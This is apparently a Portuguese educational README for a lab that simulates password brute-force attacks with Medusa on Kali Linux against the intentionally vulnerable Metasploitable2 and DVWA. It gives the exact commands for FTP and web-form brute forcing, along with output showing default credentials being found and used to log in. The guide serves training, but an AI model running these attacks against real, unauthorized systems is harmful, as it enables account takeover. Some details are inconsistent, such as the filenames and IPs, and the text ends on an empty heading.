# Ataque-de-Brute-Force-de-Senhas-com-Medusa-e-Kali-Linux
**Objetivo**: Neste projeto iremos simular um ataque de senha utilizando o recurso Medusa do Kali Linux.

---
## Conteúdo deste pacote
- `README.md` = Obtém a documentação e a explicação.
- `users.txt` = wordlist de usuários de exemplo.
- `pass.txt` = wordlist de senhas de exemplo.

---
## O que será preciso antes de começar
- `VirtualBox` = É uma máquina virtual usada para instalar os sistemas operacionais que serão necessários.
- `Kali Linux` = O Kali Linux é muito usado por conta das suas ferramentas de segurança e testes de penetração (atacante).
- `Metasploitable2` = máquina virtual intencionalmente vulnerável para treinamento e testes (alvo).

---
## Rede e atualização
### Atualização
**Abra o Kali Linux;** em seguida, abra um terminal e execute os comandos abaixo para atualizar o sistema e instalar as ferramentas necessárias.
```
sudo apt update && sudo apt upgrade -y
sudo apt install medusa hydra enum4linux smbclient smbmap net-tools tcpdump -y
```

### Rede
**Manter o Kali Linux e o Metasploitable2 na mesma rede: para verificar se ambas as máquinas encontram‑se na mesma rede**, abra um terminal no Kali e execute `ip a` (ou `ifconfig`, se disponível) para obter o endereço IP. Confirme que os endereços pertencem à mesma faixa de rede (por exemplo, `192.168.56.0/24`). Caso contrário, abra as **Configurações** → **Rede** da máquina virtual no VirtualBox e, em **Conectado a**, selecione **Host‑Only Adapter** ou **Rede Interna** para isolar o laboratório. Após a alteração, aplique as configurações e verifique novamente a conectividade.

**IPs de exemplo:**
- Kali: `192.168.56.100`
- Metasploitable2: `192.168.56.101`

---
### Ataques 
#### FTP força bruta (Medusa) 

**Executar Comando na ferramenta medusa**

`medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 4`

**O que faz:** Tenta autenticar no serviço FTP do host 192.168.56.101 usando combinações do `users.txt` e `pass.txt` das wordlists fornecidas.

**Saída**
```
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 4
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (1 of 4 complete)
2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (1 of 4 complete)
2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (2 of 4 complete)
2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
2025-10-22 17:30:50 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: 123456 (2 of 4 complete)
2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: password (3 of 4 complete)
2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: qwerty (4 of 4 complete)
2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (4 of 4 complete)
2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password (2 of 4 complete)
2025-10-22 17:30:51 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2025-10-22 17:30:51 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: qwerty (3 of 4 complete)
2025-10-22 17:30:51 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
2025-10-22 17:30:55 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (2 of 4 complete)
2025-10-22 17:30:55 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (3 of 4 complete)
2025-10-22 17:30:55 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
```
Percebe-se que, na linha 5 da saída, obtivemos um sucesso: usuário `msfadmin`, senha `msfadmin`.

**Verificação:** execute ftp 192.168.56.101 para confirmar.

Resultado esperado:
```
Connected to 192.168.56.101.
220 (vsFTPd 2.3.4)
Name (192.168.56.101:kali): msfadmin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
---
#### Força Bruta em Formulário Web (DVWA)

**Comando Executado:**
```
medusa -h 192.168.56.102 -u admin -P pass.txt -M http -m DIR=/dvwa/login.php -m FORM-DATA="username=%USER%&password=%PASS%&Login=Login" -v 4
```
**O que faz:** envia requisições de login HTTP ao endpoint /dvwa/login.php em 192.168.56.102, testando o usuário admin com as senhas do arquivo senhas.txt até encontrar uma combinação válida.

**Parâmetros-chave:** host -h, usuário -u admin, wordlist de senhas -P pass.txt, módulo -M http, endpoint -m DIR=/dvwa/login.php, corpo do formulário -m FORM-DATA=..., verbosidade -v 4.

**Resultado esperado:** abrir no navegador http://192.168.56.101/dvwa/login.php e testar as credenciais encontradas.
---
#### 



